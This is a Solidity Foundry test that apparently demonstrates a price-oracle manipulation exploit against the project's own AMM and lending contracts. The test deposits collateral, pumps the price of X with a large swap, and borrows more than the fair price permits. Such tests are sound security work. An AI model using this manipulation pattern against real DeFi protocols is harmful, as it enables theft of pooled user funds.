// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/AMM.sol";
import "../src/Lending.sol";

contract ManipulationTest is Test {
    AMM amm;
    Lending lend;

    function setUp() public {
        amm = new AMM(1_000e18, 1_000e18);
        lend = new Lending(amm);
    }

    function test_priceManipulationBorrow() public {
        // attacker deposits X as collateral
        lend.depositX(10e18);

        // manipulate price by swapping Y for X to inflate X price
        amm.swapYforX(900e18); // pump price of X

        uint256 price = amm.priceXinY();
        assertGt(price, 1e18);

        // borrow more than would be possible at fair price
        lend.borrowY(15e18);

        // at fair price 1:1, 10 X collateral -> 5 Y max
        // here we borrowed more due to manipulation
        assertGt(lend.debtY(address(this)), 5e18);
    }
}
